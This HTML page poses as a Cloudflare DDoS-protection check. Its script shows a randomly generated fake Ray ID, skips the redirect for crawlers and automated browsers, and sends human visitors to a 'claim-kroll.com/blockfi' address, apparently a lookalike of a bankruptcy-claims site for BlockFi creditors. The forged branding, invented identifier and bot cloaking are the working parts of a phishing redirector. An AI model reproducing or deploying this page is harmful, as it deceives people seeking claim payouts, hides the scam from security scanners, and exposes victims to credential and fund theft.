<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <meta name="robots" content="noindex,nofollow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Just a moment...</title>
  <style>
    html, body {
      margin: 0; padding: 0;
      width: 100vw; height: 100vh;
      font-family: Helvetica, Arial, sans-serif;
      background: #fff;
      color: #404040;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    .spinner-container {
      display: flex;
      justify-content: center;
      margin-bottom: 30px;
      gap: 6px;
    }
    .bubbles {
      background: #404040;
      width: 15px; height: 15px;
      border-radius: 50%;
      animation: bubbles 1s infinite ease-in-out;
    }
    .bubbles:nth-child(1) { animation-delay: 0s; }
    .bubbles:nth-child(2) { animation-delay: 0.1s; }
    .bubbles:nth-child(3) { animation-delay: 0.2s; }
    @keyframes bubbles {
      0%, 100% { transform: translateY(0); }
      33% { transform: translateY(5px); }
      66% { transform: translateY(-5px); }
    }
    h1 {
      font-size: 1.5em;
      margin: 10px 0;
      text-align: center;
    }
    p {
      font-size: 1em;
      margin: 10px 0;
      text-align: center;
    }
    .attribution {
      margin-top: 30px;
      text-align: center;
      color: #0000EE;
      text-decoration: underline;
      font-size: 12px;
    }
    #cf-content {
      display: none;
    }
  </style>
</head>
<body>
  <div class="spinner-container">
    <div class="bubbles"></div>
    <div class="bubbles"></div>
    <div class="bubbles"></div>
  </div>
  <div id="cf-content" style="display:none">
    <h1>Checking your browser</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <p>Please allow up to 5 seconds...</p>
  </div>
  <div class="attribution">
    <span>DDoS protection by Cloudflare</span>
</div>
<div style="font-size: 12px;">
    Ray ID: <span style="font-family: monospace;" id="ray-id"></span>
  </div>

  <script>
    const REDIRECT_URL = 'https://restructuring.claim-kroll.com/blockfi';

    function generateRayID() {
      let result = '';
      const hex = '0123456789abcdef';
      for (let i = 0; i < 16; i++) {
        result += hex[Math.floor(Math.random() * 16)];
      }
      return result;
    }

    function isBot() {
      const agent = navigator.userAgent.toLowerCase();
      return (
        navigator.webdriver ||
        /bot|crawl|spider|crawling|preview/.test(agent)
      );
    }

    function handleRedirect() {
      document.getElementById('cf-content').style.display = 'block';
      document.getElementById('ray-id').textContent = generateRayID();
      if (isBot()) return;
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 5000);
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', handleRedirect);
    } else {
      handleRedirect();
    }
  </script>
</body>
</html>
